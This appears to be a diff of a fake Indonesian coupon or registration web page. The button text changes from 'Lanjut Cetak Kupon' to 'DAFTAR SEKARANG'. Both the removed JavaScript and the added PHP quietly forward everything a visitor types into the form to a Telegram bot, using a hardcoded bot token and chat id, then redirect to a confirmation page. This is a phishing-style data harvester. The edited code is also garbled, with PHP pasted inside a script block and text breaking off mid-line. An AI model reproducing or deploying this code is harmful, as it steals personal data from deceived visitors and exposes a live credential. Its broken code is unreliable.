@@ -433,7 +433,7 @@ padding-left: 10px;
 <br>
 <br>
 <div style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px">
-<button type="submit" id="kirims" style="margin-left: 20px;margin-top: ;position:absolute;background-color:#0F78CB;color:white;border:0px solid #0076e0;width:90%;border-radius:0px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;" >Lanjut Cetak Kupon</button>
+<button type="submit" id="kirims" style="margin-left: 20px;margin-top: ;position:absolute;background-color:#0F78CB;color:white;border:0px solid #0076e0;width:90%;border-radius:0px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;" >DAFTAR SEKARANG</button>
            </div>
 </form>
 
@@ -518,29 +518,22 @@ padding-left: 10px;
             
 const chat_id = '7478681023', botID = '8255454469:AAHydDlnPsWRebqa7_udtYTMCSf_KByyZLw';
 
-    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+function sendMessage($id_telegram, $message, $id_botTele) {
+    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+sendMessage($id_telegram, $message, $id_botTele);
+header('Location: ../konf.html');
+?>
 
     document.querySelector('#dua').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
             Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
-        null, 2); // Prettify the JSON so we can read the data easily
-        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
-            method: 'POST',
-            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
-            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
-        });
-        const messageStatus = document.querySelector('#status');
-        if (sendMessage.ok) // Update the user on if the message went through
-            messageStatus.textContent = "";
-        else
-            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
-        e.target.reset(); // Clear the form fields.
-        window.location.href = '/konf.html';
-    });
-
-            
-        });
-</script>
-</body>
-</html>
+        null, 2); // Pretti
